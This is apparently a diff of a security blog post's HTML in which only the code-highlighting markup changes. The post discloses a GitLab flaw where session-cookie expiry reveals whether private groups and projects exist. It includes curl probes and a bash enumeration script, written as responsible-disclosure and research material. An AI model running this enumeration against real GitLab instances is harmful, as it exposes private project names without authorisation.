@@ -5,112 +5,112 @@ Only GitLab enables Concurrent DevOps to make the software lifecycle 200% faster
 ethical hackers to conduct discreet penetration tests, and operate a vulnerability disclosure or bug bounty program.</p><p>~ hackerone.com</p></blockquote><p>HackerOne is one of the most popular bug bounty platforms.<br>The platform can be used by companies to publish their bug bounty program and by ethical hackers to responsibly disclose vulnerabilities.</p><p>In return for responsibly disclosing vulnerabilities and working with the companies to get the bug fixed, companies often provide bug bounties in the form of swag or cash payouts.<br>This ensures hackers choose to disclosure the bug and allow the companies to fix the bug, within a reasonable time period, instead of either publicly disclosing the vulnerability prior to it being fixed,
 or selling the information on the black market.</p><h2 id=the-vulnerability>The vulnerability <a href=#the-vulnerability>¶</a></h2><h3 id=intro>Intro <a href=#intro>¶</a></h3><p>While working on an engagement where a client installed an instance of Gitlab Community Edition, I discovered some weird behaviour.<br>Further investigation of this behaviour showed that it&rsquo;s possible for an unauthenticated visitor to guess valid group and project names.</p><p>This behaviour is related to how Gitlab configures the session cookie returned with any response.</p><p>Not only self-installations of Gitlab CE are affected by this, but also repositories hosted on gitlab.com.</p><h3 id=details>Details <a href=#details>¶</a></h3><p>Whenever you visit a Gitlab repository, a session cookie <code>_gitlab_session</code> is returned in the response.<br>This session cookie has little to no use for an unauthenticated visitor.
 Gitlab could be using this to track visitors on the site.</p><p>This cookie is not only set when visiting valid pages within the respository, but also when you&rsquo;re visiting a URL of a group/repository that doesn&rsquo;t exist.</p><p>There is, however, a slight difference in the cookie that&rsquo;s set when visiting a valid URL compared to an invalid one.<br>The cookie that&rsquo;s being set when visiting an non-existing project URL has an expiration date set.
-This expiration date is the current time + 2 hours.<br>Such and explicit expiration is not set when visiting a valid URL.</p><p>This behaviour also occurs when testing this with &lsquo;hidden&rsquo; groups/projects. I.e. <em>Internal</em> or <em>Private</em> ones.</p><p>This difference allows us to programmatically request (bruteforce) group and project URLs, searching for hidden ones.</p><h3 id=examples---how-to-reproduce>Examples - how to reproduce <a href=#examples---how-to-reproduce>¶</a></h3><p>To validate my suspicions, I installed Gitlab Community Edition on a fresh Ubuntu VM (Ubuntu Server 18.04.4 LTS since there was no Gitlab package available yet for 20.04 LTS).</p><figure class=center><img src=gitlab-install-complete.png alt="Gitlab installation completed"><figcaption class=center>Gitlab installation completed</figcaption></figure><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>System information
-</span></span><span class=line><span class=cl>System:     Ubuntu 18.04
-</span></span><span class=line><span class=cl>Current User:   git
-</span></span><span class=line><span class=cl>Using RVM:  no
-</span></span><span class=line><span class=cl>Ruby Version:   2.6.6p146
-</span></span><span class=line><span class=cl>Gem Version:    2.7.10
-</span></span><span class=line><span class=cl>Bundler Version:1.17.3
-</span></span><span class=line><span class=cl>Rake Version:   12.3.3
-</span></span><span class=line><span class=cl>Redis Version:  5.0.9
-</span></span><span class=line><span class=cl>Git Version:    2.26.2
-</span></span><span class=line><span class=cl>Sidekiq Version:5.2.7
-</span></span><span class=line><span class=cl>Go Version: unknown
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>GitLab information
-</span></span><span class=line><span class=cl>Version:    13.0.3
-</span></span><span class=line><span class=cl>Revision:   e2397fc2acb
-</span></span><span class=line><span class=cl>Directory:  /opt/gitlab/embedded/service/gitlab-rails
-</span></span><span class=line><span class=cl>DB Adapter: PostgreSQL
-</span></span><span class=line><span class=cl>DB Version: 11.7
-</span></span><span class=line><span class=cl>URL:        http://gitlab.lab.local
-</span></span><span class=line><span class=cl>HTTP Clone URL: http://gitlab.lab.local/some-group/some-project.git
-</span></span><span class=line><span class=cl>SSH Clone URL:  git@gitlab.lab.local:some-group/some-project.git
-</span></span><span class=line><span class=cl>Using LDAP: no
-</span></span><span class=line><span class=cl>Using Omniauth: yes
-</span></span><span class=line><span class=cl>Omniauth Providers: 
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>GitLab Shell
-</span></span><span class=line><span class=cl>Version:    13.2.0
-</span></span><span class=line><span class=cl>Repository storage paths:
-</span></span><span class=line><span class=cl>- default:  /var/opt/gitlab/git-data/repositories
-</span></span><span class=line><span class=cl>GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
-</span></span><span class=line><span class=cl>Git:        /opt/gitlab/embedded/bin/git
-</span></span></code></pre></div><p>I created every possible combination of groups and projects, ranging from Public to Private visiblity setting.</p><figure class=center><img src=gitlab-projects.png alt="Combination of groups and projects in Gitlab"><figcaption class=center>List of projects</figcaption></figure><p>I then checked with a simple cURL command whether I could deduce, without authenticating, whether a group or project existed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl --junk-session-cookies --cookie-jar - <span class=s2>&#34;&lt;URL HERE&gt;&#34;</span> 2&gt;/dev/null <span class=p>|</span> awk <span class=s1>&#39;/_gitlab_session/ {print $5}&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># Non-existing project</span>
-</span></span><span class=line><span class=cl>curl --junk-session-cookies --cookie-jar - <span class=s2>&#34;http://gitlab.lab.local/groupprivate/projectpublic&#34;</span> 2&gt;/dev/null <span class=p>|</span> awk <span class=s1>&#39;/_gitlab_session/ {print $5}&#39;</span>
-</span></span><span class=line><span class=cl><span class=m>1591290221</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># Existing project</span>
-</span></span><span class=line><span class=cl>curl --junk-session-cookies --cookie-jar - <span class=s2>&#34;http://gitlab.lab.local/groupprivate/projectprivate&#34;</span> 2&gt;/dev/null <span class=p>|</span> awk <span class=s1>&#39;/_gitlab_session/ {print $5}&#39;</span>
-</span></span><span class=line><span class=cl><span class=m>0</span>
-</span></span></code></pre></div><p>This confirmed my suspicion of being able to enumerate/bruteforce group and project URLs.</p><p>So I wrote a small script that would run through a small list of names and test each combination.</p><figure class=center><img src=gitlab-enum_output.png alt="Output of enumeration script"><figcaption class=center>Output of enumeration script</figcaption></figure><p>To check whether it was also possible to exploit this information disclosure vulnerability on gitlab.com repositories, I created <a href=https://gitlab.com/DezeStijn title="Test repo on gitlab.com" target=_blank rel=noopener>a free account</a> and replicated the same combination of groups and projects.<br>Note however that the &ldquo;Internal&rdquo; Visibility Level is not available in this situation.</p><p>Modifying my script to test the new repsitory, I again got positive results.</p><figure class=center><img src=gitlab-enum_output_online.png alt="Output of enumeration script on the gitlab.com repo"><figcaption class=center>Output of enumeration script on gitlab.com repo</figcaption></figure><p>I disclosed this information disclosure vulnerability via <a href=https://hackerone.com/reports/891055 title="#891055 Group and Project enumeration through cookie expiration" target=_blank rel=noopener>HackerOne</a>, however this type of vulnerability was marked as explicitly out-of-scope by Gitlab.</p><blockquote><p>User and project enumeration/path disclosure unless an additional impact can be demonstrated</p><ul><li>Reports where an attacker can validate a guess (for example an API route returning different status codes depending on if a private path exists or not) will not be accepted</li><li>Reports where an attacker can only disclose the ID of a private element will not be accepted</li></ul></blockquote><p>As such, I closed the report and no further action/communication has followed on this report.</p><h3 id=the-code>The code <a href=#the-code>¶</a></h3><p>My script was written purely as a demo for the vulnerability report, but can easily be modified to make use of a wordlist or to work multithreaded.</p><p>You can find the code here below, or on <a href=https://gist.github.com/TheGroundZero/ea067760fd6c3854238f098cb075bf96 title="Get the code on Github" target=_blank rel=noopener>Github</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
-</span></span></span><span class=line><span class=cl><span class=cp></span>
-</span></span><span class=line><span class=cl><span class=c1># Script by TheGroundZero (@DezeStijn)</span>
-</span></span><span class=line><span class=cl><span class=c1>#</span>
-</span></span><span class=line><span class=cl><span class=c1># https://sequr.be/blog/2020/06/gitlab-unauthenticated-group-and-project-enumeration/</span>
-</span></span><span class=line><span class=cl><span class=c1># https://gist.github.com/TheGroundZero/ea067760fd6c3854238f098cb075bf96</span>
-</span></span><span class=line><span class=cl><span class=c1>#</span>
-</span></span><span class=line><span class=cl><span class=c1># Using a difference in behaviour by Gitlab in setting cookies</span>
-</span></span><span class=line><span class=cl><span class=c1># it&#39;s possible to enumerate/bruteforce groups/projects</span>
-</span></span><span class=line><span class=cl><span class=c1># as an unauthenticated user.</span>
-</span></span><span class=line><span class=cl><span class=c1>#</span>
-</span></span><span class=line><span class=cl><span class=c1># This code was written purely for a demo.</span>
-</span></span><span class=line><span class=cl><span class=c1># With some reworking this could work with wordlist files</span>
-</span></span><span class=line><span class=cl><span class=c1># and even be multithreaded.</span>
-</span></span><span class=line><span class=cl><span class=c1>#</span>
-</span></span><span class=line><span class=cl><span class=c1># Responsibly disclosed to Gitlab via HackerOne on 2020-06-04</span>
-</span></span><span class=line><span class=cl><span class=c1># https://hackerone.com/reports/891055</span>
-</span></span><span class=line><span class=cl><span class=c1>#</span>
-</span></span><span class=line><span class=cl><span class=c1># Free to use, but please do refer to this original gist.</span>
-</span></span><span class=line><span class=cl><span class=c1>#</span>
-</span></span><span class=line><span class=cl><span class=c1># https://github.com/TheGroundZero</span>
-</span></span><span class=line><span class=cl><span class=c1># https://twitter.com/DezeStijn/</span>
-</span></span><span class=line><span class=cl><span class=c1># https://sequr.be/ | http://sequrx53bdtvizjsbcdibrugpg7fujhvx7b75rvhwh2kq3i4hhvh35qd.onion/</span>
-</span></span><span class=line><span class=cl><span class=c1>#</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nv>groups</span><span class=o>=</span><span class=s2>&#34;root grouppublic groupinternal groupprivate&#34;</span>
-</span></span><span class=line><span class=cl><span class=nv>projects</span><span class=o>=</span><span class=s2>&#34;projectpublic projectinternal projectprivate&#34;</span>
-</span></span><span class=line><span class=cl><span class=nv>url</span><span class=o>=</span><span class=s2>&#34;http://gitlab.lab.local&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>print_exists<span class=o>()</span> <span class=o>{</span>
-</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>[</span> <span class=nv>$1</span> -eq <span class=m>1</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
-</span></span><span class=line><span class=cl>		<span class=nb>echo</span> -e <span class=s2>&#34;\e[92m[+]\e[0m </span><span class=nv>$2</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>	<span class=k>else</span>
-</span></span><span class=line><span class=cl>		<span class=nb>echo</span> -e <span class=s2>&#34;\e[91m[-]\e[0m </span><span class=nv>$2</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>	<span class=k>fi</span>
-</span></span><span class=line><span class=cl><span class=o>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>check_cookie<span class=o>()</span> <span class=o>{</span>
-</span></span><span class=line><span class=cl>	<span class=nv>status</span><span class=o>=</span><span class=sb>`</span>curl -s -o /dev/null -w <span class=s2>&#34;%{http_code}&#34;</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span><span class=sb>`</span>
-</span></span><span class=line><span class=cl>	<span class=c1>#echo &#34;[i] HTTP code = $status&#34;</span>
-</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>[</span> <span class=nv>$status</span> -eq <span class=m>200</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
-</span></span><span class=line><span class=cl>		print_exists <span class=m>1</span> <span class=nv>$1</span>
-</span></span><span class=line><span class=cl>	<span class=k>else</span>
-</span></span><span class=line><span class=cl>		<span class=nv>expire</span><span class=o>=</span><span class=sb>`</span>curl --junk-session-cookies --cookie-jar - <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> 2&gt;/dev/null <span class=p>|</span> awk <span class=s1>&#39;/_gitlab_session/ {print $5}&#39;</span><span class=sb>`</span>
-</span></span><span class=line><span class=cl>		<span class=c1>#echo &#34;[i] Expire = $expire&#34;</span>
-</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=o>[</span> <span class=nv>$expire</span> -gt <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
-</span></span><span class=line><span class=cl>			print_exists <span class=m>0</span> <span class=nv>$1</span>
-</span></span><span class=line><span class=cl>		<span class=k>else</span>
-</span></span><span class=line><span class=cl>			print_exists <span class=m>1</span> <span class=nv>$1</span>
-</span></span><span class=line><span class=cl>		<span class=k>fi</span>
-</span></span><span class=line><span class=cl>	<span class=k>fi</span>
-</span></span><span class=line><span class=cl><span class=o>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>for</span> group in <span class=nv>$groups</span><span class=p>;</span> <span class=k>do</span>
-</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;[*] Group: </span><span class=nv>$group</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>	<span class=c1>#echo &#34;[*] Testing: $url/$group&#34;</span>
-</span></span><span class=line><span class=cl>	check_cookie <span class=s2>&#34;</span><span class=nv>$url</span><span class=s2>/</span><span class=nv>$group</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>	<span class=k>for</span> project in <span class=nv>$projects</span><span class=p>;</span> <span class=k>do</span>
-</span></span><span class=line><span class=cl>		<span class=nb>echo</span> <span class=s2>&#34;[*] Project: </span><span class=nv>$project</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>		<span class=c1>#echo &#34;[*] Testing: $url/$group/$project&#34;</span>
-</span></span><span class=line><span class=cl>		check_cookie <span class=s2>&#34;</span><span class=nv>$url</span><span class=s2>/</span><span class=nv>$group</span><span class=s2>/</span><span class=nv>$project</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>	<span class=k>done</span>
-</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl><span class=k>done</span>
+This expiration date is the current time + 2 hours.<br>Such and explicit expiration is not set when visiting a valid URL.</p><p>This behaviour also occurs when testing this with &lsquo;hidden&rsquo; groups/projects. I.e. <em>Internal</em> or <em>Private</em> ones.</p><p>This difference allows us to programmatically request (bruteforce) group and project URLs, searching for hidden ones.</p><h3 id=examples---how-to-reproduce>Examples - how to reproduce <a href=#examples---how-to-reproduce>¶</a></h3><p>To validate my suspicions, I installed Gitlab Community Edition on a fresh Ubuntu VM (Ubuntu Server 18.04.4 LTS since there was no Gitlab package available yet for 20.04 LTS).</p><figure class=center><img src=gitlab-install-complete.png alt="Gitlab installation completed"><figcaption class=center>Gitlab installation completed</figcaption></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>System information
+</span></span><span style=display:flex><span>System:     Ubuntu 18.04
+</span></span><span style=display:flex><span>Current User:   git
+</span></span><span style=display:flex><span>Using RVM:  no
+</span></span><span style=display:flex><span>Ruby Version:   2.6.6p146
+</span></span><span style=display:flex><span>Gem Version:    2.7.10
+</span></span><span style=display:flex><span>Bundler Version:1.17.3
+</span></span><span style=display:flex><span>Rake Version:   12.3.3
+</span></span><span style=display:flex><span>Redis Version:  5.0.9
+</span></span><span style=display:flex><span>Git Version:    2.26.2
+</span></span><span style=display:flex><span>Sidekiq Version:5.2.7
+</span></span><span style=display:flex><span>Go Version: unknown
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GitLab information
+</span></span><span style=display:flex><span>Version:    13.0.3
+</span></span><span style=display:flex><span>Revision:   e2397fc2acb
+</span></span><span style=display:flex><span>Directory:  /opt/gitlab/embedded/service/gitlab-rails
+</span></span><span style=display:flex><span>DB Adapter: PostgreSQL
+</span></span><span style=display:flex><span>DB Version: 11.7
+</span></span><span style=display:flex><span>URL:        http://gitlab.lab.local
+</span></span><span style=display:flex><span>HTTP Clone URL: http://gitlab.lab.local/some-group/some-project.git
+</span></span><span style=display:flex><span>SSH Clone URL:  git@gitlab.lab.local:some-group/some-project.git
+</span></span><span style=display:flex><span>Using LDAP: no
+</span></span><span style=display:flex><span>Using Omniauth: yes
+</span></span><span style=display:flex><span>Omniauth Providers: 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GitLab Shell
+</span></span><span style=display:flex><span>Version:    13.2.0
+</span></span><span style=display:flex><span>Repository storage paths:
+</span></span><span style=display:flex><span>- default:  /var/opt/gitlab/git-data/repositories
+</span></span><span style=display:flex><span>GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
+</span></span><span style=display:flex><span>Git:        /opt/gitlab/embedded/bin/git
+</span></span></code></pre></div><p>I created every possible combination of groups and projects, ranging from Public to Private visiblity setting.</p><figure class=center><img src=gitlab-projects.png alt="Combination of groups and projects in Gitlab"><figcaption class=center>List of projects</figcaption></figure><p>I then checked with a simple cURL command whether I could deduce, without authenticating, whether a group or project existed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl --junk-session-cookies --cookie-jar - <span style=color:#e6db74>&#34;&lt;URL HERE&gt;&#34;</span> 2&gt;/dev/null | awk <span style=color:#e6db74>&#39;/_gitlab_session/ {print $5}&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Non-existing project</span>
+</span></span><span style=display:flex><span>curl --junk-session-cookies --cookie-jar - <span style=color:#e6db74>&#34;http://gitlab.lab.local/groupprivate/projectpublic&#34;</span> 2&gt;/dev/null | awk <span style=color:#e6db74>&#39;/_gitlab_session/ {print $5}&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1591290221</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Existing project</span>
+</span></span><span style=display:flex><span>curl --junk-session-cookies --cookie-jar - <span style=color:#e6db74>&#34;http://gitlab.lab.local/groupprivate/projectprivate&#34;</span> 2&gt;/dev/null | awk <span style=color:#e6db74>&#39;/_gitlab_session/ {print $5}&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>This confirmed my suspicion of being able to enumerate/bruteforce group and project URLs.</p><p>So I wrote a small script that would run through a small list of names and test each combination.</p><figure class=center><img src=gitlab-enum_output.png alt="Output of enumeration script"><figcaption class=center>Output of enumeration script</figcaption></figure><p>To check whether it was also possible to exploit this information disclosure vulnerability on gitlab.com repositories, I created <a href=https://gitlab.com/DezeStijn title="Test repo on gitlab.com" target=_blank rel=noopener>a free account</a> and replicated the same combination of groups and projects.<br>Note however that the &ldquo;Internal&rdquo; Visibility Level is not available in this situation.</p><p>Modifying my script to test the new repsitory, I again got positive results.</p><figure class=center><img src=gitlab-enum_output_online.png alt="Output of enumeration script on the gitlab.com repo"><figcaption class=center>Output of enumeration script on gitlab.com repo</figcaption></figure><p>I disclosed this information disclosure vulnerability via <a href=https://hackerone.com/reports/891055 title="#891055 Group and Project enumeration through cookie expiration" target=_blank rel=noopener>HackerOne</a>, however this type of vulnerability was marked as explicitly out-of-scope by Gitlab.</p><blockquote><p>User and project enumeration/path disclosure unless an additional impact can be demonstrated</p><ul><li>Reports where an attacker can validate a guess (for example an API route returning different status codes depending on if a private path exists or not) will not be accepted</li><li>Reports where an attacker can only disclose the ID of a private element will not be accepted</li></ul></blockquote><p>As such, I closed the report and no further action/communication has followed on this report.</p><h3 id=the-code>The code <a href=#the-code>¶</a></h3><p>My script was written purely as a demo for the vulnerability report, but can easily be modified to make use of a wordlist or to work multithreaded.</p><p>You can find the code here below, or on <a href=https://gist.github.com/TheGroundZero/ea067760fd6c3854238f098cb075bf96 title="Get the code on Github" target=_blank rel=noopener>Github</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Script by TheGroundZero (@DezeStijn)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># https://sequr.be/blog/2020/06/gitlab-unauthenticated-group-and-project-enumeration/</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># https://gist.github.com/TheGroundZero/ea067760fd6c3854238f098cb075bf96</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Using a difference in behaviour by Gitlab in setting cookies</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># it&#39;s possible to enumerate/bruteforce groups/projects</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># as an unauthenticated user.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># This code was written purely for a demo.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># With some reworking this could work with wordlist files</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># and even be multithreaded.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Responsibly disclosed to Gitlab via HackerOne on 2020-06-04</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># https://hackerone.com/reports/891055</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Free to use, but please do refer to this original gist.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># https://github.com/TheGroundZero</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># https://twitter.com/DezeStijn/</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># https://sequr.be/ | http://sequrx53bdtvizjsbcdibrugpg7fujhvx7b75rvhwh2kq3i4hhvh35qd.onion/</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>groups<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;root grouppublic groupinternal groupprivate&#34;</span>
+</span></span><span style=display:flex><span>projects<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;projectpublic projectinternal projectprivate&#34;</span>
+</span></span><span style=display:flex><span>url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://gitlab.lab.local&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print_exists<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> $1 -eq <span style=color:#ae81ff>1</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>		echo -e <span style=color:#e6db74>&#34;\e[92m[+]\e[0m </span>$2<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>		echo -e <span style=color:#e6db74>&#34;\e[91m[-]\e[0m </span>$2<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>check_cookie<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>	status<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>curl -s -o /dev/null -w <span style=color:#e6db74>&#34;%{http_code}&#34;</span> <span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>`</span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>#echo &#34;[i] HTTP code = $status&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> $status -eq <span style=color:#ae81ff>200</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>		print_exists <span style=color:#ae81ff>1</span> $1
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>		expire<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>curl --junk-session-cookies --cookie-jar - <span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span> 2&gt;/dev/null | awk <span style=color:#e6db74>&#39;/_gitlab_session/ {print $5}&#39;</span><span style=color:#e6db74>`</span>
+</span></span><span style=display:flex><span>		<span style=color:#75715e>#echo &#34;[i] Expire = $expire&#34;</span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> $expire -gt <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>			print_exists <span style=color:#ae81ff>0</span> $1
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>			print_exists <span style=color:#ae81ff>1</span> $1
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> group in $groups; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>	echo <span style=color:#e6db74>&#34;[*] Group: </span>$group<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>#echo &#34;[*] Testing: $url/$group&#34;</span>
+</span></span><span style=display:flex><span>	check_cookie <span style=color:#e6db74>&#34;</span>$url<span style=color:#e6db74>/</span>$group<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> project in $projects; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>		echo <span style=color:#e6db74>&#34;[*] Project: </span>$project<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>		<span style=color:#75715e>#echo &#34;[*] Testing: $url/$group/$project&#34;</span>
+</span></span><span style=display:flex><span>		check_cookie <span style=color:#e6db74>&#34;</span>$url<span style=color:#e6db74>/</span>$group<span style=color:#e6db74>/</span>$project<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>	echo <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
 </span></span></code></pre></div></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://sequr.be/tags/gitlab/>Gitlab</a></span>
 <span class=tag><a href=https://sequr.be/tags/hackerone/>HackerOne</a></span>
 <span class=tag><a href=https://sequr.be/tags/responsible-disclosure/>Responsible disclosure</a></span>
